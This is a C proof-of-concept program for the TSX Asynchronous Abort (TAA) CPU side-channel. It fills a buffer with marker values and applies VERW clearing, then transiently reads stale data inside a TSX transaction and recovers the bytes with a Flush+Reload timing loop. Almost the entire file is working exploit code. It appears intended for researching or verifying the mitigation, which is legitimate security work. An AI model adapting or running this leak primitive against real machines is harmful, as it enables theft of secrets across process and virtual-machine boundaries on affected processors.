#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>

#ifndef ITERS
#define ITERS 100000
#endif

#ifndef VICTIM_OFFSET
#define VICTIM_OFFSET 0x110
#endif

#ifndef READ_OFFSET
#define READ_OFFSET 0x10
#endif

#ifndef MAX_VALUE
#define MAX_VALUE 256
#endif

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
	uint64_t lo, hi;

	asm volatile("rdtscp\n" : "=a" (lo), "=d" (hi) :: "rcx");

	return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) void clflush(volatile void *p) {
	asm volatile("clflush (%0)\n" :: "r" (p));
}

int main(int argc, char *argv[]) {
	__attribute__((aligned(4096))) size_t results[256] = {0};

	/* flush/reload buffer */
	unsigned char *reloadbuffer = mmap(NULL, 4096 + (256 * 1024), PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	/* leak is used by TAA only */
	volatile unsigned char *leak = mmap(NULL, 4096*4, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	/* privatebuf stores secret */
	volatile unsigned char *privatebuf = mmap(NULL, 4096*16, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	// adjust offsets
	reloadbuffer = reloadbuffer + 0x80;
	leak = leak + 0x100;

	for (size_t i = 0; i < ITERS; ++i) {
		/* write values */
		for (unsigned int n = 0; n < 8192; n += 32) {
			/*
			this compiles to the following, no register usage:

			movl   $0x42,(%rax)
			movl   $0x20,-0x10(%rax)
			add    $0x20,%rax
			movl   $0x31,-0x28(%rax)
			movl   $0x53,-0x18(%rax)
			*/
			*(volatile unsigned int *)(privatebuf+n+16) = 0x42;
			*(volatile unsigned int *)(privatebuf+n) = 0x20;
			*(volatile unsigned int *)(privatebuf+n+8) = 0x31;
			*(volatile unsigned int *)(privatebuf+n+24) = 0x53;
		}

		/* fence */
		asm volatile("lfence\n");
		asm volatile("mfence\n");
		asm volatile("sfence\n");

		/* apply verw */
		asm volatile(
			"verw_here:\n"
			"sub $8, %rsp\n"
			"mov %ds, (%rsp)\n"
			"verw (%rsp)\n"
			"add $8, %rsp\n"
			"lfence\n"
			);

		/* flush */
		for (size_t k = 0; k < MAX_VALUE; ++k) {
			size_t x = ((k * 167) + 13) & (MAX_VALUE-1);
			clflush(reloadbuffer + x * 1024);
		}

		/* TAA variant */
		clflush(leak + READ_OFFSET);
		asm volatile("sfence");
		clflush(leak + 256);
		asm volatile(
		"xbegin abortpoint\n"
		"movntdqa (%0), %%xmm0\n"
		"movq %%xmm0, %%rax\n"
		"and $0xff, %%rax\n"
		"shl $0xa, %%rax\n"
		"movntdqa (%%rax, %1), %%xmm0\n"
		"xend\n"
		"abortpoint:\n"
		::"r"(leak + READ_OFFSET), "r"(reloadbuffer):"rax"
		);

		asm volatile ("mfence");

		/* reload */
		for (size_t k = 0; k < MAX_VALUE; ++k) {
			size_t x = ((k * 167) + 13) & (MAX_VALUE-1);
			unsigned char *p = reloadbuffer + (1024 * x);

			uint64_t t0 = rdtscp();
			*(volatile unsigned char *)p;
			uint64_t dt = rdtscp() - t0;

			if (dt < 160) results[x]++;
		}
	}

	size_t total = 0;
	for (size_t c = 0; c < 256; ++c) {
		if (results[c])
			printf("%8zu: 0x%02x\n", results[c], (int)c);
		total += results[c];
	}
	printf("total: %8zu\n", total);
}

